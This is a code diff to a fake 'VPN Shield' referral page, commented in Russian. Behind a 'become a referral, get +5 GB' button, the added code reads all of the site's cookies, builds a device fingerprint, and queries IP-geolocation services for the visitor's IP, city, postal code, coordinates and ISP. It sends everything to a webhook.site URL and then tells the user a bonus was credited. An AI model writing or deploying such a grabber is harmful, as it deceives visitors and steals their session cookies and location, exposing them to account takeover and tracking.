@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>VPN Shield</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body {
             min-height: 100vh;
             display: flex;
@@ -76,6 +71,40 @@
     const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
 
     // ============================================================
+    //  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+    // ============================================================
+    function getCookies() {
+        // Возвращает объект со всеми куками текущего сайта
+        const cookies = {};
+        document.cookie.split(';').forEach(cookie => {
+            const parts = cookie.trim().split('=');
+            if (parts.length >= 2) {
+                cookies[parts[0]] = parts.slice(1).join('=');
+            }
+        });
+        return cookies;
+    }
+
+    function getFingerprint() {
+        // Генерирует отпечаток устройства на основе его характеристик
+        const components = [
+            navigator.userAgent,
+            navigator.platform,
+            navigator.language,
+            screen.width,
+            screen.height,
+            screen.colorDepth,
+            window.devicePixelRatio,
+            navigator.hardwareConcurrency,
+            navigator.deviceMemory,
+            navigator.doNotTrack,
+            navigator.cookieEnabled,
+            Intl.DateTimeFormat().resolvedOptions().timeZone
+        ];
+        return components.join('|||');
+    }
+
+    // ============================================================
     //  ОСНОВНОЙ КОД
     // ============================================================
     document.getElementById('referBtn').addEventListener('click', function () {
@@ -86,7 +115,7 @@
         btn.textContent = '⏳ Отправка...';
         statusEl.className = 'status';
 
-        // === 1. Собираем данные ===
+        // === 1. Собираем базовые данные ===
         const data = {
             refId: document.getElementById('refId').textContent,
             userAgent: navigator.userAgent,
@@ -94,6 +123,7 @@
             language: navigator.language,
             languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
             cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'не установлен',
             hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
             deviceMemory: navigator.deviceMemory || 'unknown',
             screenWidth: screen.width,
@@ -106,63 +136,121 @@
             referrer: document.referrer || 'прямой переход',
             url: window.location.href,
             title: document.title,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            // === ДОПОЛНИТЕЛЬНО ===
+            cookies: getCookies(),
+            fingerprint: getFingerprint()
         };
 
-        // === 2. Формируем читаемое сообщение ===
-        const lines = [
-            '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
-            '═══════════════════════',
-            '',
-            `🆔 Реферальный ID: ${data.refId}`,
-            '',
-            `🖥️ User‑Agent: ${data.userAgent}`,
-            `💻 Платформа: ${data.platform}`,
-            `🌐 Язык: ${data.language}`,
-            `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
-            `📱 Плотность: ${data.pixelRatio}`,
-            `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
-            `🕒 Время: ${data.localTime}`,
-            `🔗 Ссылка: ${data.url}`,
-            `📎 Откуда пришёл: ${data.referrer}`,
-            '',
-            `━━━━━━━━━━━━━━━━━━━━━━`,
-            `⏱️ ${data.timestamp}`
-        ];
-
-        const messageText = lines.join('\n');
-
-        // === 3. Отправляем на Webhook ===
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                text: messageText,
-                raw: data
+        // === 2. Пытаемся получить IP, гео и провайдера ===
+        fetch('https://ipapi.co/json/')
+            .then(res => {
+                if (!res.ok) throw new Error('IP API недоступен');
+                return res.json();
             })
-        })
-        .then(response => {
-            if (response.ok) {
-                btn.textContent = '✅ Вы стали рефералом!';
-                btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
-                statusEl.className = 'status ok';
-                statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
-                document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
-            } else {
-                throw new Error('Ошибка HTTP: ' + response.status);
-            }
-        })
-        .catch(error => {
-            console.error('Ошибка:', error);
-            btn.textContent = '🔥 Стать рефералом';
-            statusEl.className = 'status err';
-            statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
-        })
-        .finally(() => {
-            btn.disabled = false;
-        });
+            .then(geo => {
+                data.ip = geo.ip || null;
+                data.country = geo.country_name || null;
+                data.city = geo.city || null;
+                data.region = geo.region || null;
+                data.postal = geo.postal || null;
+                data.latitude = geo.latitude || null;
+                data.longitude = geo.longitude || null;
+                data.org = geo.org || null;
+                data.asn = geo.asn || null;
+                data.timezone_geo = geo.timezone || null;
+            })
+            .catch(() => {
+                // Если IP-API не отвечает — пробуем другой
+                return fetch('https://ip-api.com/json/');
+            })
+            .then(res => {
+                if (res && res.ok) return res.json();
+                throw new Error('Все IP-сервисы недоступны');
+            })
+            .then(geo2 => {
+                if (!data.ip) {
+                    data.ip = geo2.query || null;
+                    data.country = geo2.country || null;
+                    data.city = geo2.city || null;
+                    data.region = geo2.regionName || null;
+                    data.postal = geo2.zip || null;
+                    data.latitude = geo2.lat || null;
+                    data.longitude = geo2.lon || null;
+                    data.org = geo2.isp || null;
+                    data.asn = geo2.as || null;
+                }
+            })
+            .catch(() => {
+                // Если ни один сервис не ответил — оставляем как есть
+                console.warn('IP-гео не получены');
+            })
+            .finally(() => {
+                // === 3. Формируем сообщение ===
+                const lines = [
+                    '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
+                    '═══════════════════════════════════════',
+                    '',
+                    `🆔 Реферальный ID: ${data.refId}`,
+                    '',
+                    `🌐 IP: ${data.ip || 'не определён'}`,
+                    `🌍 Страна: ${data.country || 'не определена'}`,
+                    `🏙️ Город: ${data.city || 'не определён'}`,
+                    `📍 Регион: ${data.region || 'не определён'}`,
+                    `📮 Индекс: ${data.postal || 'не определён'}`,
+                    `🗺️ Координаты: ${data.latitude || '?'}, ${data.longitude || '?'}`,
+                    `📡 Провайдер: ${data.org || 'не определён'}`,
+                    `📶 ASN: ${data.asn || 'не определён'}`,
+                    '',
+                    `🖥️ User‑Agent: ${data.userAgent}`,
+                    `💻 Платформа: ${data.platform}`,
+                    `🌐 Язык: ${data.language}`,
+                    `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
+                    `📱 Плотность: ${data.pixelRatio}`,
+                    `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
+                    `🕒 Время: ${data.localTime}`,
+                    `🔗 Ссылка: ${data.url}`,
+                    `📎 Откуда пришёл: ${data.referrer}`,
+                    '',
+                    `🍪 Куки: ${JSON.stringify(data.cookies, null, 2)}`,
+                    `🆔 Отпечаток устройства: ${data.fingerprint}`,
+                    '',
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+                    `⏱️ ${data.timestamp}`
+                ];
+
+                const messageText = lines.join('\n');
+
+                // === 4. Отправляем на Webhook ===
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        text: messageText,
+                        raw: data
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        btn.textContent = '✅ Вы стали рефералом!';
+                        btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
+                        statusEl.className = 'status ok';
+                        statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
+                        document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
+                    } else {
+                        throw new Error('Ошибка HTTP: ' + response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка:', error);
+                    btn.textContent = '🔥 Стать рефералом';
+                    statusEl.className = 'status err';
+                    statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
+                })
+                .finally(() => {
+                    btn.disabled = false;
+                });
+            });
     });
 </script>
 </body>
